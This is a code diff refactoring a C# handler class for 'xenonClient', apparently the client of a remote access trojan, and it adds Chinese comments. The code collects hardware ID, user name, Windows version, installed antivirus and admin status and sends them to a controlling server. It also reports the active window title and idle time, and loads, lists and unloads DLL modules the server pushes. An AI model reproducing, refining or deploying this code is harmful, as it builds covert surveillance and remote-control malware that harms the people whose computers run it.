@@ -4,20 +4,23 @@ using System.Diagnostics;
 using System.Linq;
 using System.Security.Principal;
 using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
 
 namespace xenonClient
 {
     class Handler
     {
-        Node Main;
-        DllHandler dllhandler;
-        public Handler(Node _Main, DllHandler _dllhandler) 
+        private Node Main;
+        private DllHandler dllhandler;
+
+        // 构造函数初始化主节点和DLL处理器
+        public Handler(Node main, DllHandler dllHandler) 
         {
-            dllhandler = _dllhandler;
-            Main = _Main;
+            this.dllhandler = dllHandler;
+            this.Main = main;
         }
+
+        // 创建子套接字并根据类型处理接收的数据
         public async Task CreateSubSock(byte[] data)
         {
             try
@@ -27,67 +30,69 @@ namespace xenonClient
                 Node sub = await Main.ConnectSubSockAsync(type, retid, OnDisconnect);
                 sub.Parent = Main;
                 Main.AddSubNode(sub);
-                if (sub.SockType == 1)
+
+                switch (sub.SockType)
                 {
-                    await Type1Receive(sub);
-                }
-                else if (sub.SockType == 2)
-                {
-                    await Type2Receive(sub);
-                }
-                else
-                {
-                    if (sub == null) return;
-                    sub.Disconnect();
+                    case 1:
+                        await Type1Receive(sub);
+                        break;
+                    case 2:
+                        await Type2Receive(sub);
+                        break;
+                    default:
+                        sub?.Disconnect();
+                        break;
                 }
             }
             catch 
             {
-                Console.WriteLine("error with subnode, subnode type=" + data[1]);
+                Console.WriteLine($"Error with subnode, subnode type={data[1]}");
             }
         }
-        private void OnDisconnect(Node SubNode) 
+
+        // 空的断开连接处理函数
+        private void OnDisconnect(Node subNode) 
         { 
-            
+            // 断开连接时的处理逻辑
         }
 
-        private async Task GetAndSendInfo(Node Type0) 
+        // 获取并发送客户端信息
+        private async Task GetAndSendInfo(Node type0) 
         {
-            if (Type0.SockType != 0) 
+            if (type0.SockType != 0) return;
+
+            string clientVersion = "1.8.7"; // 假设的客户端版本
+            string[] info = new string[] 
             {
-                return;
-            }
-            //get hwid, username etc. seperated by null
-            string clientversion = "1.8.7";//find a way to get the client version.
-            string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
-            byte[] data = new byte[0];
-            byte[] nullbyte = new byte[] { 0 };
-            for(int i=0;i<info.Length;i++) 
-            {
-                byte[] byte_data = Encoding.UTF8.GetBytes(info[i]);
-                data = SocketHandler.Concat(data, byte_data);
-                if (i != info.Length - 1) 
-                {
-                    data = SocketHandler.Concat(data, nullbyte);
-                }
-            }
-            await Type0.SendAsync(data);
+                Utils.HWID(),
+                Environment.UserName,
+                WindowsIdentity.GetCurrent().Name,
+                clientVersion,
+                Utils.GetWindowsVersion(),
+                Utils.GetAntivirus(),
+                Utils.IsAdmin().ToString()
+            };
+
+            byte[] data = info
+                .SelectMany((value, index) => Encoding.UTF8.GetBytes(value).Concat(index < info.Length - 1 ? new byte[] { 0 } : new byte[0]))
+                .ToArray();
+
+            await type0.SendAsync(data);
         }
 
+        // 处理类型0的接收逻辑
         public async Task Type0Receive()
         {
             while (Main.Connected())
             {
                 byte[] data = await Main.ReceiveAsync();
-                if (data == null) 
-                {
-                    break;
-                }
+                if (data == null) break;
+
                 int opcode = data[0];
                 switch (opcode)
                 {
                     case 0:
-                        CreateSubSock(data);
+                        await CreateSubSock(data);
                         break;
                     case 1:
                         await GetAndSendInfo(Main);
@@ -106,46 +111,48 @@ namespace xenonClient
             }
             Main.Disconnect();
         }
+
+        // 处理类型1的接收逻辑
         public async Task Type1Receive(Node subServer)
         {
-            byte[] HearbeatReply = new byte[] { 1 };
-            byte[] HearbeatFail = new byte[] { 2 };
+            byte[] heartbeatReply = new byte[] { 1 };
+            byte[] heartbeatFail = new byte[] { 2 };
             subServer.SetRecvTimeout(5000);
+
             while (subServer.Connected() && Main.Connected())
             {
                 await Task.Delay(1000);
                 byte[] data = await subServer.ReceiveAsync();
-                if (data == null)
-                {
-                    break;
-                }
+                if (data == null) break;
+
                 int opcode = data[0];
                 if (opcode != 0) 
                 {
-                    await subServer.SendAsync(HearbeatFail);
+                    await subServer.SendAsync(heartbeatFail);
                     break;
                 }
-                await subServer.SendAsync(HearbeatReply);
+                await subServer.SendAsync(heartbeatReply);
             }
             Main.Disconnect();
             subServer.Disconnect();
         }
-        private async Task setSetId(Node subServer, byte[] data) 
+
+        // 设置子服务器的ID
+        private async Task SetSetId(Node subServer, byte[] data) 
         {
             byte[] worked = new byte[] { 1 };
             subServer.SetId = subServer.sock.BytesToInt(data, 1);
             await subServer.SendAsync(worked);
-
         }
+
+        // 处理类型2的接收逻辑
         public async Task Type2Receive(Node subServer)
         {
             while (subServer.Connected() && Main.Connected())
             {
-                byte[] data =await subServer.ReceiveAsync();
-                if (data == null)
-                {
-                    break;
-                }
+                byte[] data = await subServer.ReceiveAsync();
+                if (data == null) break;
+
                 int opcode = data[0];
                 switch (opcode)
                 {
@@ -154,22 +161,21 @@ namespace xenonClient
                         break;
                     case 1:
                         await dllhandler.DllNodeHandler(subServer);
-                        goto outofwhileloop;
+                        return; // 退出循环
                     case 2:
-                        await setSetId(subServer,data);
+                        await SetSetId(subServer, data);
                         break;
                     case 3:
-                        return;
+                        return; // 退出循环
                     case 4:
                         await DebugMenu(subServer, data);
                         break;
-
                 }
             }
-            outofwhileloop:
             subServer.Disconnect();
         }
 
+        // 调试菜单处理
         public async Task DebugMenu(Node subServer, byte[] data) 
         {
             int opcode = data[1];
@@ -177,31 +183,26 @@ namespace xenonClient
             {
                 case 0:
                     await subServer.SendAsync(Encoding.UTF8.GetBytes(String.Join("\n", dllhandler.Assemblies.Keys)));
-                    break;//get dlls
+                    break;
                 case 1:
-                    string assm=Encoding.UTF8.GetString(data.Skip(2).ToArray());
-                    bool worked = false;
-                    if (dllhandler.Assemblies.Keys.Contains(assm)) 
-                    {
-                        worked=dllhandler.Assemblies.Remove(assm);
-                    }
-
+                    string assemblyName = Encoding.UTF8.GetString(data.Skip(2).ToArray());
+                    bool worked = dllhandler.Assemblies.Keys.Contains(assemblyName) && dllhandler.Assemblies.Remove(assemblyName);
                     await subServer.SendAsync(new byte[] { (byte)(worked ? 1 : 0) });
-                    break;//unload dll
+                    break;
                 case 2:
                     await subServer.SendAsync(Encoding.UTF8.GetBytes(Program.ProcessLog.ToString()));
-                    break;//get console log
+                    break;
             }
         }
 
+        // 发送更新信息
         public async Task SendUpdateInfo(Node node) 
         {
-            string currwin = await Utils.GetCaptionOfActiveWindowAsync();
-            string idleTime = ((await Utils.GetIdleTimeAsync()) /1000).ToString();
-            string update_data = currwin + "\n" + idleTime;
-            byte[] data=Encoding.UTF8.GetBytes(update_data);
+            string currentWindow = await Utils.GetCaptionOfActiveWindowAsync();
+            string idleTime = (await Utils.GetIdleTimeAsync() / 1000).ToString();
+            string updateData = $"{currentWindow}\n{idleTime}";
+            byte[] data = Encoding.UTF8.GetBytes(updateData);
             await node.SendAsync(data);
         }
-
     }
 }
